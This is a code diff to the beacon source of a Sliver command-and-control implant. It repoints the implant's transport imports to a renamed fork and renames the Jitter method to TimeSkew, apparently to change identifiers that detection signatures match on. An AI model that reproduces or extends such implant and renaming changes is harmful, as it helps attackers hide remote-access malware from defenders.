@@ -33,19 +33,19 @@ import (
 	// {{if .Config.IncludeMTLS}}
 	"crypto/tls"
 
-	"github.com/bishopfox/sliver/implant/sliver/transports/mtls"
+	"github.com/papcaii/slisli/implant/sliver/transports/mtls"
 
 	// {{end}}
 
 	// {{if .Config.IncludeHTTP}}
-	"github.com/bishopfox/sliver/implant/sliver/transports/httpclient"
+	"github.com/papcaii/slisli/implant/sliver/transports/httpclient"
 	// {{end}}
 
 	// {{if .Config.IncludeWG}}
 	"errors"
 	"net"
 
-	"github.com/bishopfox/sliver/implant/sliver/transports/wireguard"
+	"github.com/papcaii/slisli/implant/sliver/transports/wireguard"
 	"golang.zx2c4.com/wireguard/device"
 
 	// {{end}}
@@ -56,10 +56,10 @@ import (
 
 	// {{if .Config.IncludeDNS}}
 
-	"github.com/bishopfox/sliver/implant/sliver/transports/dnsclient"
+	"github.com/papcaii/slisli/implant/sliver/transports/dnsclient"
 	// {{end}}
 
-	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
+	pb "github.com/papcaii/slisli/protobuf/sliverpb"
 )
 
 var (
@@ -92,18 +92,18 @@ func (b *Beacon) Interval() int64 {
 }
 
 // Jitter - Jitter between beacons
-func (b *Beacon) Jitter() int64 {
-	return GetJitter()
+func (b *Beacon) TimeSkew() int64 {
+	return GetTimeSkew()
 }
 
 // Duration - Interval + random value <= Jitter
 func (b *Beacon) Duration() time.Duration {
 	// {{if .Config.Debug}}
-	log.Printf("Interval: %v Jitter: %v", b.Interval(), b.Jitter())
+	log.Printf("Interval: %v Jitter: %v", b.Interval(), b.TimeSkew())
 	// {{end}}
 	jitterDuration := time.Duration(0)
-	if 0 < b.Jitter() {
-		jitterDuration = time.Duration(insecureRand.Int63n(b.Jitter()))
+	if 0 < b.TimeSkew() {
+		jitterDuration = time.Duration(insecureRand.Int63n(b.TimeSkew()))
 	}
 	duration := time.Duration(b.Interval()) + jitterDuration
 	// {{if .Config.Debug}}
